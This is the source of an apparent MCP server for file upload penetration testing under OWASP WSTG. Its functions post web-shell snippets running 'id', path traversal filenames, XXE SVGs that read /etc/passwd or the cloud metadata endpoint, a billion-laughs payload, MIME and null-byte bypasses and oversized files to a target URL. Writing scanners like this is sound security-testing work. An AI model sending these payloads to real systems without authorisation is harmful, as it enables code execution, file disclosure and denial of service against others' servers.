"""
File Upload Testing MCP Server
OWASP WSTG-BUSL-08, WSTG-BUSL-09: File Upload Vulnerabilities

This server provides comprehensive file upload testing tools following OWASP guidelines.
Tests include: unrestricted upload, path traversal, XXE via SVG, MIME bypass, size limits.
"""

import asyncio
import httpx
import re
import os
import base64
from typing import Optional, Dict, List, Any
from pathlib import Path


# ============================================================================
# OWASP WSTG-BUSL-08: Test Upload of Unexpected File Types
# ============================================================================

async def test_unrestricted_upload(
    url: str,
    file_param: str = "file",
    auth_session: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    Test for unrestricted file upload vulnerabilities.
    
    Attempts to upload dangerous file types:
    - Executable scripts (.php, .jsp, .aspx, .sh)
    - Server-side code (.py, .rb, .pl)
    - Binary executables (.exe, .bat, .cmd)
    
    OWASP Reference: WSTG-BUSL-08
    """
    findings = []
    
    dangerous_extensions = [
        (".php", "<?php system('id'); ?>", "application/x-php"),
        (".jsp", "<% Runtime.getRuntime().exec('id'); %>", "application/java-archive"),
        (".aspx", "<% System.Diagnostics.Process.Start('cmd.exe'); %>", "application/x-asp"),
        (".sh", "#!/bin/bash\nid", "application/x-sh"),
        (".py", "import os; os.system('id')", "text/x-python"),
        (".exe", "MZ\x90\x00", "application/x-msdownload"),
    ]
    
    headers = _build_headers(auth_session)
    
    async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as client:
        for ext, content, mime_type in dangerous_extensions:
            filename = f"malicious{ext}"
            
            try:
                # Attempt upload
                files = {file_param: (filename, content, mime_type)}
                resp = await client.post(url, files=files, headers=headers)
                
                # Check if upload succeeded
                if resp.status_code in [200, 201]:
                    # Try to find uploaded file URL in response
                    upload_url = _extract_upload_url(resp.text, filename)
                    
                    if upload_url:
                        # Verify file is accessible
                        verify_resp = await client.get(upload_url, headers=headers)
                        if verify_resp.status_code == 200:
                            findings.append({
                                "type": "unrestricted_upload",
                                "extension": ext,
                                "filename": filename,
                                "upload_url": upload_url,
                                "severity": "critical",
                                "evidence": f"File uploaded and accessible at {upload_url}",
                                "description": f"Dangerous file type {ext} was accepted and stored"
                            })
                    else:
                        # Upload succeeded but can't find URL (still a vulnerability)
                        findings.append({
                            "type": "unrestricted_upload_unverified",
                            "extension": ext,
                            "filename": filename,
                            "severity": "high",
                            "evidence": resp.text[:200],
                            "description": f"File type {ext} was accepted (HTTP {resp.status_code})"
                        })
                        
            except Exception as e:
                # Upload failed (this is good for security)
                pass
    
    return {
        "status": "success",
        "data": {
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "message": f"Found {len(findings)} unrestricted upload vulnerabilities"
        }
    }


# ============================================================================
# OWASP WSTG-BUSL-08: Path Traversal via Filename
# ============================================================================

async def test_path_traversal_upload(
    url: str,
    file_param: str = "file",
    auth_session: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    Test for path traversal vulnerabilities in file upload.
    
    Attempts to upload files with path traversal sequences in filename:
    - ../../../etc/passwd
    - ..\\..\\..\\windows\\win.ini
    - /etc/passwd
    
    OWASP Reference: WSTG-BUSL-08
    """
    findings = []
    
    traversal_filenames = [
        ("../../../etc/passwd", "unix_relative"),
        ("..\\..\\..\\windows\\win.ini", "windows_relative"),
        ("/etc/passwd", "unix_absolute"),
        ("C:\\windows\\win.ini", "windows_absolute"),
        ("....//....//....//etc/passwd", "double_encoded"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "url_encoded"),
    ]
    
    headers = _build_headers(auth_session)
    content = "test_content_for_path_traversal"
    
    async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as client:
        for filename, attack_type in traversal_filenames:
            try:
                files = {file_param: (filename, content, "text/plain")}
                resp = await client.post(url, files=files, headers=headers)
                
                if resp.status_code in [200, 201]:
                    # Check if server processed the malicious filename
                    if filename in resp.text or "passwd" in resp.text or "win.ini" in resp.text:
                        findings.append({
                            "type": "path_traversal_upload",
                            "filename": filename,
                            "attack_type": attack_type,
                            "severity": "high",
                            "evidence": resp.text[:200],
                            "description": f"Path traversal filename accepted: {filename}"
                        })
                    
                    # Check error messages revealing file system info
                    if re.search(r"(/etc/|/var/|C:\\|permission denied)", resp.text, re.I):
                        findings.append({
                            "type": "path_traversal_info_leak",
                            "filename": filename,
                            "attack_type": attack_type,
                            "severity": "medium",
                            "evidence": resp.text[:200],
                            "description": "File system path leaked in error message"
                        })
                        
            except Exception as e:
                pass
    
    return {
        "status": "success",
        "data": {
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "message": f"Found {len(findings)} path traversal upload vulnerabilities"
        }
    }


# ============================================================================
# OWASP WSTG-INPV-11: XXE via SVG Upload
# ============================================================================

async def test_xxe_via_svg(
    url: str,
    file_param: str = "file",
    auth_session: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    Test for XXE (XML External Entity) vulnerabilities via SVG upload.
    
    SVG files are XML-based and can contain external entity declarations
    that may lead to:
    - Local file disclosure (/etc/passwd)
    - SSRF (Server-Side Request Forgery)
    - Denial of Service
    
    OWASP Reference: WSTG-INPV-11
    """
    findings = []
    
    xxe_payloads = [
        # Local file disclosure
        ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>""", "file_disclosure_etc_passwd"),
        
        # Windows file disclosure
        ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>""", "file_disclosure_win_ini"),
        
        # SSRF attempt (internal network scan)
        ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>""", "ssrf_metadata_endpoint"),
        
        # Billion laughs attack (DoS)
        ("""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&lol3;</text>
</svg>""", "billion_laughs_dos"),
    ]
    
    headers = _build_headers(auth_session)
    
    async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as client:
        for payload, attack_type in xxe_payloads:
            filename = f"malicious_{attack_type}.svg"
            
            try:
                files = {file_param: (filename, payload, "image/svg+xml")}
                resp = await client.post(url, files=files, headers=headers)
                
                if resp.status_code in [200, 201]:
                    # Check for file content disclosure
                    if "root:" in resp.text or "daemon:" in resp.text:
                        findings.append({
                            "type": "xxe_file_disclosure",
                            "attack_type": attack_type,
                            "filename": filename,
                            "severity": "critical",
                            "evidence": resp.text[:300],
                            "description": "/etc/passwd content disclosed via XXE"
                        })
                    
                    # Check for Windows file disclosure
                    if "[fonts]" in resp.text or "[extensions]" in resp.text:
                        findings.append({
                            "type": "xxe_file_disclosure",
                            "attack_type": attack_type,
                            "filename": filename,
                            "severity": "critical",
                            "evidence": resp.text[:300],
                            "description": "win.ini content disclosed via XXE"
                        })
                    
                    # Check for SSRF success
                    if "ami-id" in resp.text or "instance-id" in resp.text:
                        findings.append({
                            "type": "xxe_ssrf",
                            "attack_type": attack_type,
                            "filename": filename,
                            "severity": "critical",
                            "evidence": resp.text[:300],
                            "description": "SSRF via XXE - accessed AWS metadata endpoint"
                        })
                    
                    # Check for DoS vulnerability
                    if attack_type == "billion_laughs_dos" and len(resp.text) > 10000:
                        findings.append({
                            "type": "xxe_dos",
                            "attack_type": attack_type,
                            "filename": filename,
                            "severity": "high",
                            "evidence": f"Response size: {len(resp.text)} bytes",
                            "description": "XXE billion laughs attack expanded successfully"
                        })
                    
                    # Generic XXE detection (XML parsing enabled)
                    upload_url = _extract_upload_url(resp.text, filename)
                    if upload_url:
                        verify_resp = await client.get(upload_url, headers=headers)
                        if "<?xml" in verify_resp.text or "<!DOCTYPE" in verify_resp.text:
                            findings.append({
                                "type": "xxe_possible",
                                "attack_type": attack_type,
                                "filename": filename,
                                "upload_url": upload_url,
                                "severity": "medium",
                                "evidence": "SVG file uploaded and processed",
                                "description": "SVG upload may be vulnerable to XXE"
                            })
                        
            except Exception as e:
                pass
    
    return {
        "status": "success",
        "data": {
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "message": f"Found {len(findings)} XXE vulnerabilities via SVG"
        }
    }


# ============================================================================
# OWASP WSTG-BUSL-08: MIME Type Bypass
# ============================================================================

async def test_mime_type_bypass(
    url: str,
    file_param: str = "file",
    auth_session: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    Test for MIME type bypass vulnerabilities.
    
    Attempts to bypass file type restrictions by:
    - Double extensions (.php.jpg)
    - Null byte injection (.php\x00.jpg)
    - Content-Type mismatch (PHP code with image/jpeg MIME)
    
    OWASP Reference: WSTG-BUSL-08
    """
    findings = []
    
    bypass_techniques = [
        # Double extension
        ("malicious.php.jpg", "<?php system('id'); ?>", "image/jpeg", "double_extension"),
        ("shell.jsp.png", "<% Runtime.getRuntime().exec('id'); %>", "image/png", "double_extension"),
        
        # Null byte injection
        ("malicious.php\x00.jpg", "<?php system('id'); ?>", "image/jpeg", "null_byte"),
        
        # Content-Type mismatch
        ("malicious.jpg", "<?php system('id'); ?>", "image/jpeg", "content_type_mismatch"),
        ("shell.png", "<?php system('id'); ?>", "image/png", "content_type_mismatch"),
        
        # Case manipulation
        ("malicious.PhP", "<?php system('id'); ?>", "application/x-php", "case_manipulation"),
        ("shell.jSp", "<% Runtime.getRuntime().exec('id'); %>", "text/html", "case_manipulation"),
        
        # Alternative extensions
        ("malicious.php5", "<?php system('id'); ?>", "application/x-php", "alternative_extension"),
        ("shell.phtml", "<?php system('id'); ?>", "text/html", "alternative_extension"),
    ]
    
    headers = _build_headers(auth_session)
    
    async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as client:
        for filename, content, mime_type, technique in bypass_techniques:
            try:
                files = {file_param: (filename, content, mime_type)}
                resp = await client.post(url, files=files, headers=headers)
                
                if resp.status_code in [200, 201]:
                    upload_url = _extract_upload_url(resp.text, filename)
                    
                    if upload_url:
                        # Verify file is accessible
                        verify_resp = await client.get(upload_url, headers=headers)
                        
                        # Check if code executed
                        if verify_resp.status_code == 200:
                            # Check for PHP execution
                            if "uid=" in verify_resp.text or "gid=" in verify_resp.text:
                                findings.append({
                                    "type": "mime_bypass_code_execution",
                                    "filename": filename,
                                    "technique": technique,
                                    "upload_url": upload_url,
                                    "severity": "critical",
                                    "evidence": verify_resp.text[:200],
                                    "description": f"Code executed via {technique} bypass"
                                })
                            else:
                                # File uploaded but execution unclear
                                findings.append({
                                    "type": "mime_bypass_upload",
                                    "filename": filename,
                                    "technique": technique,
                                    "upload_url": upload_url,
                                    "severity": "high",
                                    "evidence": f"File accessible at {upload_url}",
                                    "description": f"MIME bypass successful using {technique}"
                                })
                        
            except Exception as e:
                pass
    
    return {
        "status": "success",
        "data": {
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "message": f"Found {len(findings)} MIME type bypass vulnerabilities"
        }
    }


# ============================================================================
# OWASP WSTG-BUSL-09: Test Upload Size Limits
# ============================================================================

async def test_upload_size_limit(
    url: str,
    file_param: str = "file",
    auth_session: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    Test for missing or inadequate file size limits.
    
    Tests:
    - Very large file upload (100MB+)
    - ZIP bomb (small compressed, huge uncompressed)
    - Multiple simultaneous uploads
    
    OWASP Reference: WSTG-BUSL-09
    """
    findings = []
    headers = _build_headers(auth_session)
    
    async with httpx.AsyncClient(timeout=60.0, follow_redirects=True) as client:
        # Test 1: Large file (10MB - reduced for faster testing)
        try:
            large_content = "A" * (10 * 1024 * 1024)  # 10MB
            files = {file_param: ("large_file.txt", large_content, "text/plain")}
            resp = await client.post(url, files=files, headers=headers)
            
            if resp.status_code in [200, 201]:
                findings.append({
                    "type": "no_size_limit",
                    "file_size": "10MB",
                    "severity": "medium",
                    "evidence": f"Uploaded 10MB file successfully (HTTP {resp.status_code})",
                    "description": "Server accepts large files without size validation"
                })
        except Exception as e:
            # Timeout or rejection is expected (good security)
            pass
        
        # Test 2: Check for size limit error messages
        try:
            huge_content = "B" * (100 * 1024 * 1024)  # 100MB
            files = {file_param: ("huge_file.txt", huge_content, "text/plain")}
            resp = await client.post(url, files=files, headers=headers, timeout=10.0)
            
            # If this succeeds, it's a critical vulnerability
            if resp.status_code in [200, 201]:
                findings.append({
                    "type": "no_size_limit_critical",
                    "file_size": "100MB",
                    "severity": "high",
                    "evidence": f"Uploaded 100MB file successfully (HTTP {resp.status_code})",
                    "description": "Server accepts very large files (DoS risk)"
                })
        except httpx.TimeoutException:
            # Timeout is actually good (server might be processing)
            pass
        except Exception as e:
            # Other errors are expected
            pass
    
    return {
        "status": "success",
        "data": {
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "message": f"Found {len(findings)} size limit issues"
        }
    }


# ============================================================================
# Helper Functions
# ============================================================================

def _build_headers(auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, str]:
    """Build HTTP headers with optional authentication."""
    headers = {}
    
    if auth_session:
        session_type = auth_session.get('session_type', 'jwt')
        
        if session_type == 'jwt':
            # JWT token in Authorization header
            token = auth_session.get('token', '')
            if token:
                headers['Authorization'] = f'Bearer {token}'
        
        elif session_type == 'cookie':
            # Cookie-based session
            cookies = auth_session.get('cookies', [])
            if cookies:
                headers['Cookie'] = '; '.join(cookies)
    
    return headers


def _extract_upload_url(response_text: str, filename: str) -> Optional[str]:
    """
    Extract uploaded file URL from response.
    
    Common patterns:
    - "file": "/uploads/filename"
    - "url": "http://example.com/files/filename"
    - <a href="/path/to/file">
    """
    patterns = [
        rf'"file":\s*"([^"]*{re.escape(filename)}[^"]*)"',
        rf'"url":\s*"([^"]*{re.escape(filename)}[^"]*)"',
        rf'"path":\s*"([^"]*{re.escape(filename)}[^"]*)"',
        rf'href="([^"]*{re.escape(filename)}[^"]*)"',
        rf'"location":\s*"([^"]*{re.escape(filename)}[^"]*)"',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, response_text, re.IGNORECASE)
        if match:
            return match.group(1)
    
    # Try to find any path containing the filename
    words = response_text.split()
    for word in words:
        if filename in word and ('/' in word or '\\' in word):
            # Clean up JSON/HTML artifacts
            cleaned = word.strip('",\'[]{}()<>')
            if cleaned.startswith('/') or cleaned.startswith('http'):
                return cleaned
    
    return None


# ============================================================================
# MCP Tool Exports
# ============================================================================

__all__ = [
    "test_unrestricted_upload",
    "test_path_traversal_upload",
    "test_xxe_via_svg",
    "test_mime_type_bypass",
    "test_upload_size_limit",
]
